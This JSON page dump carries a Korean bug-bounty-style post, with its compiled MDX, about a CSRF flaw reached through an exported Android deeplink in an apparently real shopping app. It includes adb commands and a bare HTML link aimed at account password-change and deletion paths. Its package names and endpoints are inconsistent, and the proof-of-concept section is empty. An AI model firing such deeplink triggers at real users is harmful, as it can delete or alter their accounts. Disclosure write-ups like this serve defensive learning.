{"pageProps":{"post":{"title":"CSRF로 인해 계정이 삭제될 수 있습니다","description":"","date":"2024-05-23 14:47","slug":"2024-05-23-CSRFLeadstoDeleteAccount","content":"\n\n# 안녕하세요!\n\n![이미지](/assets/img/2024-05-23-CSRFLeadstoDeleteAccount_0.png)\n\n# 소개\n\n- 대상: 안드로이드 애플리케이션\n- 날짜: 2024년 5월\n- 요약: Corp 앱에서 CSRF 취약점을 발견했습니다. 이 취약점을 이용하여 사용자 계정을 삭제할 수 있는 Deeplink와 delete-account 엔드포인트 간의 상호작용이 가능합니다.\n\n<div class=\"content-ad\"></div>\n\n# 복제 단계\n\n- 먼저 AndroidMainfast.xml을 살펴봅니다.\n\n```xml\n        <activity android:theme=\"@style/Theme.Thredup.Splash\" android:name=\"com.example.android.feature.splash.SplashActivity\" android:exported=\"true\" android:launchMode=\"singleTask\" android:screenOrientation=\"behind\" android:configChanges=\"screenSize|orientation\" android:noHistory=\"true\">\n            <intent-filter android:autoVerify=\"true\">\n                <action android:name=\"android.intent.action.VIEW\"/>\n                <category android:name=\"android.intent.category.DEFAULT\"/>\n                <category android:name=\"android.intent.category.BROWSABLE\"/>\n                <data android:host=\"www.example.com\" android:pathPrefix=\"/account\"/>\n                <data android:scheme=\"https\"/>\n                <data android:scheme=\"http\"/>\n            </intent-filter>\n        </activity>\n```\n\n- 'adb'를 사용하여 호출한 후에 /account/라는 Path로 이 Deeplink를 발견했습니다.\n\n<div class=\"content-ad\"></div>\n\n- 지금은 설정에 있어요;\n- 잠시만 android:pathPrefix=/account/는 무슨 의미일까요?\n- android:pathPrefix 속성은 Intent 객체의 경로의 초기 부분에만 일치하는 부분 경로를 지정합니다. 그래서 아마도 /account/ 뒤에 무언가를 찾을 수 있을지도 모릅니다.\n- 설정 이후에 API 호출을 가로챈 후, 비밀번호 변경이나 계정 삭제와 같은 설정 후의 API 엔드포인트를 Deeplink에서 사용해 봅시다.\n\n```js\nadb shell am start -a android.intent.action.VIEW -n com.thredup.android/com.thredup.android.feature.splash.SplashActivity -d \"https://www.example.com/account/change_password\"\n\nadb shell am start -a android.intent.action.VIEW -n com.thredup.android/com.thredup.android.feature.splash.SplashActivity -d \"https://www.example.com/account/delete_password\"\n```\n\n- 지금 CSRF로 만들어 봐요.\n\n<div class=\"content-ad\"></div>\n\n```javascript\n<!DOCTYPE html>\n<html>\n<a href=\"https://www.example.com/account/change_password\">CSRF DEMO</a>\n</html>\n```\n\n# Proof of Concept","ogImage":{"url":"/assets/img/2024-05-23-CSRFLeadstoDeleteAccount_0.png"},"coverImage":"/assets/img/2024-05-23-CSRFLeadstoDeleteAccount_0.png","tag":["Tech"],"readingTime":3},"content":{"compiledSource":"/*@jsxRuntime automatic @jsxImportSource react*/\nconst {Fragment: _Fragment, jsx: _jsx, jsxs: _jsxs} = arguments[0];\nconst {useMDXComponents: _provideComponents} = arguments[0];\nfunction _createMdxContent(props) {\n  const _components = Object.assign({\n    h1: \"h1\",\n    p: \"p\",\n    img: \"img\",\n    ul: \"ul\",\n    li: \"li\",\n    pre: \"pre\",\n    code: \"code\",\n    span: \"span\",\n    div: \"div\"\n  }, _provideComponents(), props.components);\n  return _jsxs(_Fragment, {\n    children: [_jsx(_components.h1, {\n      children: \"안녕하세요!\"\n    }), \"\\n\", _jsx(_components.p, {\n      children: _jsx(_components.img, {\n        src: \"/assets/img/2024-05-23-CSRFLeadstoDeleteAccount_0.png\",\n        alt: \"이미지\"\n      })\n    }), \"\\n\", _jsx(_components.h1, {\n      children: \"소개\"\n    }), \"\\n\", _jsxs(_components.ul, {\n      children: [\"\\n\", _jsx(_components.li, {\n        children: \"대상: 안드로이드 애플리케이션\"\n      }), \"\\n\", _jsx(_components.li, {\n        children: \"날짜: 2024년 5월\"\n      }), \"\\n\", _jsx(_components.li, {\n        children: \"요약: Corp 앱에서 CSRF 취약점을 발견했습니다. 이 취약점을 이용하여 사용자 계정을 삭제할 수 있는 Deeplink와 delete-account 엔드포인트 간의 상호작용이 가능합니다.\"\n      }), \"\\n\"]\n    }), \"\\n\", _jsx(\"div\", {\n      class: \"content-ad\"\n    }), \"\\n\", _jsx(_components.h1, {\n      children: \"복제 단계\"\n    }), \"\\n\", _jsxs(_components.ul, {\n      children: [\"\\n\", _jsx(_components.li, {\n        children: \"먼저 AndroidMainfast.xml을 살펴봅니다.\"\n      }), \"\\n\"]\n    }), \"\\n\", _jsx(_components.pre, {\n      children: _jsxs(_components.code, {\n        className: \"hljs language-xml\",\n        children: [\"        \", _jsxs(_components.span, {\n          className: \"hljs-tag\",\n          children: [\"<\", _jsx(_components.span, {\n            className: \"hljs-name\",\n            children: \"activity\"\n          }), \" \", _jsx(_components.span, {\n            className: \"hljs-attr\",\n            children: \"android:theme\"\n          }), \"=\", _jsx(_components.span, {\n            className: \"hljs-string\",\n            children: \"\\\"@style/Theme.Thredup.Splash\\\"\"\n          }), \" \", _jsx(_components.span, {\n            className: \"hljs-attr\",\n            children: \"android:name\"\n          }), \"=\", _jsx(_components.span, {\n            className: \"hljs-string\",\n            children: \"\\\"com.example.android.feature.splash.SplashActivity\\\"\"\n          }), \" \", _jsx(_components.span, {\n            className: \"hljs-attr\",\n            children: \"android:exported\"\n          }), \"=\", _jsx(_components.span, {\n            className: \"hljs-string\",\n            children: \"\\\"true\\\"\"\n          }), \" \", _jsx(_components.span, {\n            className: \"hljs-attr\",\n            children: \"android:launchMode\"\n          }), \"=\", _jsx(_components.span, {\n            className: \"hljs-string\",\n            children: \"\\\"singleTask\\\"\"\n          }), \" \", _jsx(_components.span, {\n            className: \"hljs-attr\",\n            children: \"android:screenOrientation\"\n          }), \"=\", _jsx(_components.span, {\n            className: \"hljs-string\",\n            children: \"\\\"behind\\\"\"\n          }), \" \", _jsx(_components.span, {\n            className: \"hljs-attr\",\n            children: \"android:configChanges\"\n          }), \"=\", _jsx(_components.span, {\n            className: \"hljs-string\",\n            children: \"\\\"screenSize|orientation\\\"\"\n          }), \" \", _jsx(_components.span, {\n            className: \"hljs-attr\",\n            children: \"android:noHistory\"\n          }), \"=\", _jsx(_components.span, {\n            className: \"hljs-string\",\n            children: \"\\\"true\\\"\"\n          }), \">\"]\n        }), \"\\n            \", _jsxs(_components.span, {\n          className: \"hljs-tag\",\n          children: [\"<\", _jsx(_components.span, {\n            className: \"hljs-name\",\n            children: \"intent-filter\"\n          }), \" \", _jsx(_components.span, {\n            className: \"hljs-attr\",\n            children: \"android:autoVerify\"\n          }), \"=\", _jsx(_components.span, {\n            className: \"hljs-string\",\n            children: \"\\\"true\\\"\"\n          }), \">\"]\n        }), \"\\n                \", _jsxs(_components.span, {\n          className: \"hljs-tag\",\n          children: [\"<\", _jsx(_components.span, {\n            className: \"hljs-name\",\n            children: \"action\"\n          }), \" \", _jsx(_components.span, {\n            className: \"hljs-attr\",\n            children: \"android:name\"\n          }), \"=\", _jsx(_components.span, {\n            className: \"hljs-string\",\n            children: \"\\\"android.intent.action.VIEW\\\"\"\n          }), \"/>\"]\n        }), \"\\n                \", _jsxs(_components.span, {\n          className: \"hljs-tag\",\n          children: [\"<\", _jsx(_components.span, {\n            className: \"hljs-name\",\n            children: \"category\"\n          }), \" \", _jsx(_components.span, {\n            className: \"hljs-attr\",\n            children: \"android:name\"\n          }), \"=\", _jsx(_components.span, {\n            className: \"hljs-string\",\n            children: \"\\\"android.intent.category.DEFAULT\\\"\"\n          }), \"/>\"]\n        }), \"\\n                \", _jsxs(_components.span, {\n          className: \"hljs-tag\",\n          children: [\"<\", _jsx(_components.span, {\n            className: \"hljs-name\",\n            children: \"category\"\n          }), \" \", _jsx(_components.span, {\n            className: \"hljs-attr\",\n            children: \"android:name\"\n          }), \"=\", _jsx(_components.span, {\n            className: \"hljs-string\",\n            children: \"\\\"android.intent.category.BROWSABLE\\\"\"\n          }), \"/>\"]\n        }), \"\\n                \", _jsxs(_components.span, {\n          className: \"hljs-tag\",\n          children: [\"<\", _jsx(_components.span, {\n            className: \"hljs-name\",\n            children: \"data\"\n          }), \" \", _jsx(_components.span, {\n            className: \"hljs-attr\",\n            children: \"android:host\"\n          }), \"=\", _jsx(_components.span, {\n            className: \"hljs-string\",\n            children: \"\\\"www.example.com\\\"\"\n          }), \" \", _jsx(_components.span, {\n            className: \"hljs-attr\",\n            children: \"android:pathPrefix\"\n          }), \"=\", _jsx(_components.span, {\n            className: \"hljs-string\",\n            children: \"\\\"/account\\\"\"\n          }), \"/>\"]\n        }), \"\\n                \", _jsxs(_components.span, {\n          className: \"hljs-tag\",\n          children: [\"<\", _jsx(_components.span, {\n            className: \"hljs-name\",\n            children: \"data\"\n          }), \" \", _jsx(_components.span, {\n            className: \"hljs-attr\",\n            children: \"android:scheme\"\n          }), \"=\", _jsx(_components.span, {\n            className: \"hljs-string\",\n            children: \"\\\"https\\\"\"\n          }), \"/>\"]\n        }), \"\\n                \", _jsxs(_components.span, {\n          className: \"hljs-tag\",\n          children: [\"<\", _jsx(_components.span, {\n            className: \"hljs-name\",\n            children: \"data\"\n          }), \" \", _jsx(_components.span, {\n            className: \"hljs-attr\",\n            children: \"android:scheme\"\n          }), \"=\", _jsx(_components.span, {\n            className: \"hljs-string\",\n            children: \"\\\"http\\\"\"\n          }), \"/>\"]\n        }), \"\\n            \", _jsxs(_components.span, {\n          className: \"hljs-tag\",\n          children: [\"</\", _jsx(_components.span, {\n            className: \"hljs-name\",\n            children: \"intent-filter\"\n          }), \">\"]\n        }), \"\\n        \", _jsxs(_components.span, {\n          className: \"hljs-tag\",\n          children: [\"</\", _jsx(_components.span, {\n            className: \"hljs-name\",\n            children: \"activity\"\n          }), \">\"]\n        }), \"\\n\"]\n      })\n    }), \"\\n\", _jsxs(_components.ul, {\n      children: [\"\\n\", _jsx(_components.li, {\n        children: \"'adb'를 사용하여 호출한 후에 /account/라는 Path로 이 Deeplink를 발견했습니다.\"\n      }), \"\\n\"]\n    }), \"\\n\", _jsx(\"div\", {\n      class: \"content-ad\"\n    }), \"\\n\", _jsxs(_components.ul, {\n      children: [\"\\n\", _jsx(_components.li, {\n        children: \"지금은 설정에 있어요;\"\n      }), \"\\n\", _jsxs(_components.li, {\n        children: [\"잠시만 android\", _jsx(_components.div, {}), \"=/account/는 무슨 의미일까요?\"]\n      }), \"\\n\", _jsxs(_components.li, {\n        children: [\"android\", _jsx(_components.div, {}), \" 속성은 Intent 객체의 경로의 초기 부분에만 일치하는 부분 경로를 지정합니다. 그래서 아마도 /account/ 뒤에 무언가를 찾을 수 있을지도 모릅니다.\"]\n      }), \"\\n\", _jsx(_components.li, {\n        children: \"설정 이후에 API 호출을 가로챈 후, 비밀번호 변경이나 계정 삭제와 같은 설정 후의 API 엔드포인트를 Deeplink에서 사용해 봅시다.\"\n      }), \"\\n\"]\n    }), \"\\n\", _jsx(_components.pre, {\n      children: _jsxs(_components.code, {\n        className: \"hljs language-js\",\n        children: [\"adb shell am start -a android.\", _jsx(_components.span, {\n          className: \"hljs-property\",\n          children: \"intent\"\n        }), \".\", _jsx(_components.span, {\n          className: \"hljs-property\",\n          children: \"action\"\n        }), \".\", _jsx(_components.span, {\n          className: \"hljs-property\",\n          children: \"VIEW\"\n        }), \" -n com.\", _jsx(_components.span, {\n          className: \"hljs-property\",\n          children: \"thredup\"\n        }), \".\", _jsx(_components.span, {\n          className: \"hljs-property\",\n          children: \"android\"\n        }), \"/com.\", _jsx(_components.span, {\n          className: \"hljs-property\",\n          children: \"thredup\"\n        }), \".\", _jsx(_components.span, {\n          className: \"hljs-property\",\n          children: \"android\"\n        }), \".\", _jsx(_components.span, {\n          className: \"hljs-property\",\n          children: \"feature\"\n        }), \".\", _jsx(_components.span, {\n          className: \"hljs-property\",\n          children: \"splash\"\n        }), \".\", _jsx(_components.span, {\n          className: \"hljs-property\",\n          children: \"SplashActivity\"\n        }), \" -d \", _jsx(_components.span, {\n          className: \"hljs-string\",\n          children: \"\\\"https://www.example.com/account/change_password\\\"\"\n        }), \"\\n\\nadb shell am start -a android.\", _jsx(_components.span, {\n          className: \"hljs-property\",\n          children: \"intent\"\n        }), \".\", _jsx(_components.span, {\n          className: \"hljs-property\",\n          children: \"action\"\n        }), \".\", _jsx(_components.span, {\n          className: \"hljs-property\",\n          children: \"VIEW\"\n        }), \" -n com.\", _jsx(_components.span, {\n          className: \"hljs-property\",\n          children: \"thredup\"\n        }), \".\", _jsx(_components.span, {\n          className: \"hljs-property\",\n          children: \"android\"\n        }), \"/com.\", _jsx(_components.span, {\n          className: \"hljs-property\",\n          children: \"thredup\"\n        }), \".\", _jsx(_components.span, {\n          className: \"hljs-property\",\n          children: \"android\"\n        }), \".\", _jsx(_components.span, {\n          className: \"hljs-property\",\n          children: \"feature\"\n        }), \".\", _jsx(_components.span, {\n          className: \"hljs-property\",\n          children: \"splash\"\n        }), \".\", _jsx(_components.span, {\n          className: \"hljs-property\",\n          children: \"SplashActivity\"\n        }), \" -d \", _jsx(_components.span, {\n          className: \"hljs-string\",\n          children: \"\\\"https://www.example.com/account/delete_password\\\"\"\n        }), \"\\n\"]\n      })\n    }), \"\\n\", _jsxs(_components.ul, {\n      children: [\"\\n\", _jsx(_components.li, {\n        children: \"지금 CSRF로 만들어 봐요.\"\n      }), \"\\n\"]\n    }), \"\\n\", _jsx(\"div\", {\n      class: \"content-ad\"\n    }), \"\\n\", _jsx(_components.pre, {\n      children: _jsxs(_components.code, {\n        className: \"hljs language-javascript\",\n        children: [\"<!\", _jsx(_components.span, {\n          className: \"hljs-variable constant_\",\n          children: \"DOCTYPE\"\n        }), \" html>\\n\", _jsxs(_components.span, {\n          className: \"xml\",\n          children: [_jsxs(_components.span, {\n            className: \"hljs-tag\",\n            children: [\"<\", _jsx(_components.span, {\n              className: \"hljs-name\",\n              children: \"html\"\n            }), \">\"]\n          }), \"\\n\", _jsxs(_components.span, {\n            className: \"hljs-tag\",\n            children: [\"<\", _jsx(_components.span, {\n              className: \"hljs-name\",\n              children: \"a\"\n            }), \" \", _jsx(_components.span, {\n              className: \"hljs-attr\",\n              children: \"href\"\n            }), \"=\", _jsx(_components.span, {\n              className: \"hljs-string\",\n              children: \"\\\"https://www.example.com/account/change_password\\\"\"\n            }), \">\"]\n          }), \"CSRF DEMO\", _jsxs(_components.span, {\n            className: \"hljs-tag\",\n            children: [\"</\", _jsx(_components.span, {\n              className: \"hljs-name\",\n              children: \"a\"\n            }), \">\"]\n          }), \"\\n\", _jsxs(_components.span, {\n            className: \"hljs-tag\",\n            children: [\"</\", _jsx(_components.span, {\n              className: \"hljs-name\",\n              children: \"html\"\n            }), \">\"]\n          })]\n        }), \"\\n\"]\n      })\n    }), \"\\n\", _jsx(_components.h1, {\n      children: \"Proof of Concept\"\n    })]\n  });\n}\nfunction MDXContent(props = {}) {\n  const {wrapper: MDXLayout} = Object.assign({}, _provideComponents(), props.components);\n  return MDXLayout ? _jsx(MDXLayout, Object.assign({}, props, {\n    children: _jsx(_createMdxContent, props)\n  })) : _createMdxContent(props);\n}\nreturn {\n  default: MDXContent\n};\n","frontmatter":{},"scope":{}}},"__N_SSG":true}